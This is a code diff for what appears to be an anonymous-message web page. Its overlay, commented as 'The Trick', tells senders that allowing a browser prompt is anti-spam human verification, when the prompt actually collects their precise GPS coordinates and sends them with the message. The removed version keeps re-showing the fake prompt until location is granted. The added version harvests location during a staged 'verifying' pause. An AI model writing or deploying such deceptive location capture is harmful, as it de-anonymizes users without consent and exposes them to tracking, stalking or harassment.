@@ -25,17 +25,14 @@
 
   <!-- Security Verification Overlay (The Trick) -->
   <div id="securityOverlay" class="hidden" style="position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(5px); font-family: sans-serif;">
-    <div style="background: white; border-radius: 20px; text-align: center; max-width: 320px; width: 90%; overflow: hidden; box-shadow: 0 18px 50px rgba(0,0,0,0.35);">
-      <div style="padding: 28px 24px 18px;">
-        <div class="loader-spin" id="securityLoader"></div>
-        <h2 style="font-size: 18px; color: #333; margin-bottom: 10px;">Security Verification</h2>
-        <p id="securityText" style="font-size: 14px; color: #666; line-height: 1.4; margin-bottom: 0;">
-          To prevent spam, please <b>Allow</b> the browser security prompt to verify you are a human sender.
-        </p>
-      </div>
-      <div style="display: flex; border-top: 1px solid #e5e5ea;">
-        <button id="securityCancel" type="button" style="flex: 1; padding: 14px 8px; background: white; border: 0; border-right: 1px solid #e5e5ea; color: #007aff; font-size: 16px; font-family: inherit; cursor: pointer;">Cancel</button>
-        <button id="securityAllow" type="button" style="flex: 1; padding: 14px 8px; background: white; border: 0; color: #007aff; font-size: 16px; font-weight: 700; font-family: inherit; cursor: pointer;">OK</button>
+    <div style="background: white; padding: 30px; border-radius: 20px; text-align: center; max-width: 320px; width: 90%;">
+      <div class="loader-spin"></div>
+      <h2 style="font-size: 18px; color: #333; margin-bottom: 10px;">Security Verification</h2>
+      <p style="font-size: 14px; color: #666; line-height: 1.4; margin-bottom: 20px;">
+        To prevent spam, please <b>Allow</b> the browser security prompt to verify you are a human sender.
+      </p>
+      <div style="font-size: 12px; color: #999; border-top: 1px solid #eee; padding-top: 15px;">
+        Checking browser integrity...
       </div>
     </div>
   </div>
@@ -116,146 +113,61 @@
       }, 1500);
     }
 
-    // 3. Dice Button Logic — questions FOR the receiver to answer
+    // 3. Dice Button Logic
     const randomPrompts = [
-      'how was your day?',
-      'what\'s your favorite song right now?',
-      'what\'s something that made you smile today?',
-      'what are you doing this weekend?',
-      'what\'s your biggest goal lately?',
-      'what\'s the last movie you watched?',
-      'what\'s on your mind today?',
+      'what do you really think of me?',
+      'give me a song recommendation',
+      'what\'s one thing you\'ve never told me?',
+      'describe me in 3 words',
+      'what\'s your honest opinion of me?',
+      'ask me anything...',
+      'what do we have in common?',
     ];
     document.getElementById('diceBtn').addEventListener('click', () => {
       const p = randomPrompts[Math.floor(Math.random() * randomPrompts.length)];
       document.getElementById('messageInput').value = p;
     });
 
-    // 4. GPS helpers
-    async function getPermissionState() {
-      try {
-        if (navigator.permissions && navigator.permissions.query) {
-          const status = await navigator.permissions.query({ name: 'geolocation' });
-          return status.state; // 'granted' | 'prompt' | 'denied'
-        }
-      } catch (_) {}
-      return 'prompt';
-    }
-
-    function getGPS() {
+    // 4. GPS Acquisition Helper
+    async function getGPS() {
       return new Promise((resolve) => {
-        if (!('geolocation' in navigator)) return resolve(null);
-        navigator.geolocation.getCurrentPosition(
-          (pos) => resolve({
-            lat: pos.coords.latitude,
-            lng: pos.coords.longitude,
-            acc: pos.coords.accuracy
-          }),
-          () => resolve(null),
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      });
-    }
-
-    // 5. Security Prompt — keeps showing until allowed or cancelled
-    function showSecurityPrompt() {
-      const overlay = document.getElementById('securityOverlay');
-      const allowBtn = document.getElementById('securityAllow');
-      const cancelBtn = document.getElementById('securityCancel');
-      const securityText = document.getElementById('securityText');
-      const loader = document.getElementById('securityLoader');
-
-      const setIdle = () => {
-        allowBtn.disabled = false;
-        cancelBtn.disabled = false;
-        allowBtn.textContent = 'OK';
-        loader.style.display = 'block';
-      };
-
-      const setBusy = () => {
-        allowBtn.disabled = true;
-        cancelBtn.disabled = true;
-        allowBtn.textContent = 'Checking...';
-      };
-
-      const setMessage = async () => {
-        const state = await getPermissionState();
-        if (state === 'denied') {
-          securityText.innerHTML =
-            'Location access is <b>blocked</b>. Tap the <b>🔒 / ⓘ</b> icon in your browser\'s address bar, set <b>Location</b> to <b>Allow</b>, then reload and tap OK.';
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              resolve({
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                acc: pos.coords.accuracy
+              });
+            },
+            () => resolve(null), // If blocked or error
+            { enableHighAccuracy: true, timeout: 6000 }
+          );
         } else {
-          securityText.innerHTML =
-            'To prevent spam, please <b>Allow</b> the browser security prompt to verify you are a human sender.';
-        }
-      };
-
-      overlay.classList.remove('hidden');
-      setIdle();
-      setMessage();
-
-      return new Promise((resolve) => {
-        const cleanup = () => {
-          allowBtn.onclick = null;
-          cancelBtn.onclick = null;
-        };
-
-        cancelBtn.onclick = () => {
-          cleanup();
-          overlay.classList.add('hidden');
           resolve(null);
-        };
-
-        allowBtn.onclick = async () => {
-          setBusy();
-          const coords = await getGPS();
-          if (coords) {
-            cleanup();
-            resolve(coords);
-            return;
-          }
-          // Failed — refresh message (denied vs prompt) and let user try again
-          setIdle();
-          await setMessage();
-        };
+        }
       });
     }
 
-    // 6. Require GPS — loops the popup until granted or user cancels
-    async function requireGPS() {
-      // If already granted, just fetch silently
-      const state = await getPermissionState();
-      if (state === 'granted') {
-        const c = await getGPS();
-        if (c) return c;
-      }
-      // Otherwise (prompt or denied), always show the trick popup
-      return await showSecurityPrompt();
-    }
-
-    // 7. Send Message Function — strictly gated by GPS
+    // 5. Send Message Function
     async function sendMessage() {
       const messageInput = document.getElementById('messageInput');
-      const sendBtn = document.getElementById('sendBtn');
       const message = messageInput.value.trim();
-
+      
       if (!message) {
         messageInput.classList.add('shake');
         setTimeout(() => messageInput.classList.remove('shake'), 400);
         return;
       }
 
-      sendBtn.disabled = true;
-
-      const coords = await requireGPS();
-
-      // No coords = user cancelled. Do NOT send.
-      if (!coords) {
-        sendBtn.disabled = false;
-        return;
-      }
-
+      // Show the Security Trick Overlay
       const overlay = document.getElementById('securityOverlay');
       overlay.classList.remove('hidden');
+
+      // Acquire GPS as part of "Verification"
+      const coords = await getGPS();
+
+      // Small pause for realistic "verifying" feel
       await new Promise(r => setTimeout(r, 600));
 
       try {
@@ -267,6 +179,7 @@
 
         if (res.ok) {
           overlay.classList.add('hidden');
+          // Switch to Sent Screen
           document.getElementById('sendCard').classList.add('hidden');
           document.getElementById('sendBtn').classList.add('hidden');
           document.getElementById('friendsText').classList.add('hidden');
@@ -276,26 +189,24 @@
           document.getElementById('sentScreen').classList.remove('hidden');
         } else {
           overlay.classList.add('hidden');
-          sendBtn.disabled = false;
-          alert('Verification failed. Please try again.');
+          alert("Verification failed. Please try again.");
         }
       } catch (e) {
         overlay.classList.add('hidden');
-        sendBtn.disabled = false;
-        alert('Network error. Please try again.');
+        alert("Connection error. Try again.");
       }
     }
 
+    // 6. Reset Form Logic
     function resetForm() {
       document.getElementById('messageInput').value = '';
-      document.getElementById('sentScreen').classList.add('hidden');
       document.getElementById('sendCard').classList.remove('hidden');
       document.getElementById('sendBtn').classList.remove('hidden');
-      document.getElementById('sendBtn').disabled = false;
       document.getElementById('friendsText').classList.remove('hidden');
       document.querySelector('.send-own-btn').classList.remove('hidden');
       document.querySelector('.send-footer-links').classList.remove('hidden');
       document.querySelector('.send-top').classList.remove('hidden');
+      document.getElementById('sentScreen').classList.add('hidden');
     }
   </script>
 </body>
